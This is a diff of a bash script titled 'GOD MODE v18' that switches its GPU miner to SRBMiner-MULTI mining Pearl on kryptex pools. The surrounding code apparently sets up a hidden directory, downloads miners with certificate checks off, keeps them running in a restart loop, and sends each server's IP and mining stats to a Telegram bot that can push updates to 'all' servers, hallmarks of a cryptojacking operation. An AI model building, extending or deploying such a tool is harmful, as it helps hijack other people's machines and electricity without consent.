@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v17: FULL ULTIMATE MONOLITHIC SCRIPT           |
+# | GOD MODE v18: SRBMiner-MULTI PEARL (PRL) EDITION         |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -18,8 +18,10 @@ REPORT_INTERVAL=18000
 # [ POOLS ]
 POOL_CPU_1="xmr.kryptex.network:7029"
 POOL_CPU_2="xmr-eu.kryptex.network:7029"
-POOL_GPU_1="etc.kryptex.network:7033"
-POOL_GPU_2="etc-eu.kryptex.network:7033"
+
+# Pearl (PRL) Pools for GPU
+POOL_GPU_1="prl.kryptex.network:7048"
+POOL_GPU_2="prl-eu.kryptex.network:7048"
 
 # [ PRIVILEGES & HIDDEN DIRECTORY ]
 IS_ROOT=0
@@ -81,7 +83,8 @@ else
     URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 fi
 
-URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
+# SRBMiner-MULTI 3.4.7 for Pearl (PRL)
+URL_SRBMINER="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz"
 
 # CPU Setup
 if [ ! -f "$BIN_CPU" ]; then
@@ -112,16 +115,16 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup
+# GPU Setup (SRBMiner-MULTI for Pearl)
 if [ "$HAS_GPU" -eq 1 ] && [ ! -f "$BIN_GPU" ]; then
-    curl -L -k -s -o gpu.tar.gz "$URL_LOLMINER" || wget -qO gpu.tar.gz "$URL_LOLMINER"
+    curl -L -k -s -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz "$URL_SRBMINER"
     tar -xf gpu.tar.gz 2>/dev/null
-    FOUND_GPU=$(find . -type f -name "lolMiner" | head -n 1)
+    FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
     if [ -n "$FOUND_GPU" ]; then
         mv "$FOUND_GPU" "./$BIN_GPU"
         chmod +x "./$BIN_GPU"
     fi
-    rm -rf gpu.tar.gz 1.98a
+    rm -rf gpu.tar.gz SRBMiner*
 fi
 
 # ----------------------------------------------------
@@ -194,19 +197,16 @@ send_telemetry_report() {
         [ -n "\$SHARES_COUNT" ] && CPU_SHARES="\$SHARES_COUNT"
     fi
 
-    GPU_HASHRATE="0 MH/s"
+    GPU_HASHRATE="0 H/s"
     GPU_SHARES="0"
     if [ "\$HAS_GPU" -eq 1 ] && [ -f "\$LOG_GPU" ]; then
-        GPU_SPEED_LINE=\$(grep -iE "Total Speed|Average speed" "\$LOG_GPU" | tail -n 1)
+        GPU_SPEED_LINE=\$(grep -iE "Hashrate:|Total Hashrate" "\$LOG_GPU" | tail -n 1)
         if [ -n "\$GPU_SPEED_LINE" ]; then
-            RAW_GPU_SPEED=\$(echo "\$GPU_SPEED_LINE" | grep -o '[0-9.]*' | head -n 1)
-            [ -n "\$RAW_GPU_SPEED" ] && GPU_HASHRATE="\${RAW_GPU_SPEED} MH/s"
+            RAW_GPU_SPEED=\$(echo "\$GPU_SPEED_LINE" | grep -o '[0-9.]*' | tail -n 1)
+            [ -n "\$RAW_GPU_SPEED" ] && GPU_HASHRATE="\${RAW_GPU_SPEED} H/s"
         fi
-        ACC_LINE=\$(grep -i "Accepted" "\$LOG_GPU" | tail -n 1)
-        if [ -n "\$ACC_LINE" ]; then
-            RAW_ACC=\$(echo "\$ACC_LINE" | grep -o '[0-9]*' | head -n 1)
-            [ -n "\$RAW_ACC" ] && GPU_SHARES="\$RAW_ACC"
-        fi
+        SHARES_GPU=\$(grep -c -i "accepted" "\$LOG_GPU" 2>/dev/null)
+        [ -n "\$SHARES_GPU" ] && GPU_SHARES="\$SHARES_GPU"
     fi
 
     REPORT="📊 <b>\$title</b>%0A"
@@ -219,7 +219,7 @@ send_telemetry_report() {
     REPORT="\${REPORT}📦 <b>CPU Accepted Shares:</b> \$CPU_SHARES%0A%0A"
 
     if [ "\$HAS_GPU" -eq 1 ]; then
-        REPORT="\${REPORT}🎮 <b>GPU Status:</b> \$GPU_STATUS%0A"
+        REPORT="\${REPORT}🎮 <b>GPU Status (SRBMiner Pearl):</b> \$GPU_STATUS%0A"
         REPORT="\${REPORT}⚡ <b>GPU Hashrate:</b> \$GPU_HASHRATE%0A"
         REPORT="\${REPORT}📦 <b>GPU Accepted Shares:</b> \$GPU_SHARES%0A"
     else
@@ -286,7 +286,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V17 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V18 (SRBMiner Pearl Active)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -310,7 +310,8 @@ while true; do
             GPU_STATUS="🟢 Active"
             if [ -f "./\$BIN_GPU" ]; then
                 if ! pgrep -f "\$BIN_GPU" > /dev/null; then
-                    nohup ./\$BIN_GPU --algo ETCHASH --ethstratum ETCPROXY --pool \$POOL_GPU_1 --user \$WORKER --pool \$POOL_GPU_2 --user \$WORKER --nocolor --watchdog exit >> "\$LOG_GPU" 2>&1 &
+                    # SRBMiner-MULTI for Pearl (PRL) on GPU
+                    nohup ./\$BIN_GPU --algorithm pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --disable-cpu >> "\$LOG_GPU" 2>&1 &
                     sleep 2
                     if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                         GPU_STATUS="🔴 Offline / Crashed"
